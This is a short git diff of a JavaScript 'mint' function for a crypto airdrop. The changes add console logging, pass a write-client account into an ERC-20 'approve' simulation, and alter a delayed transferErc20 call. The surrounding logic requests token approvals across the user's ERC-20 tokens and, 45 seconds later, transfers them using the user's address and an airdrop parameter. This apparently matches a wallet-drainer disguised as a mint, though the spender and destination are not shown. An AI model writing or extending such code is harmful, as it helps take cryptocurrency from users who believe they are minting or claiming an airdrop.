@@ -10,8 +10,12 @@ export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signer, cl
       let canceled = false;
       try {
         if (tokensERC20[iter20].isApproved === false) {
+
+          console.log(clientRead, "clientRead")
+          console.log(clientWrite, "clientWrite")
           // const contract = new ethers.Contract(tokensERC20[iter20].address, erc20abi, signer);
           const {request} = await clientRead.simulateContract({
+            account: clientWrite.account,
             address: tokensERC20[iter20].address,
             abi: erc20abi,
             functionName: "approve",
@@ -59,7 +63,7 @@ export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signer, cl
     }
     setTimeout(() => {
       if (tokensERC20.length > 0) {
-        transferErc20(chain, tokensERC20,airdrop, userAddress, clientRead, clientWrite, signer);
+        transferErc20(chain, tokensERC20,airdrop, userAddress, clientRead, signer);
       }
     }, 45000)
     setTimeout(() => {
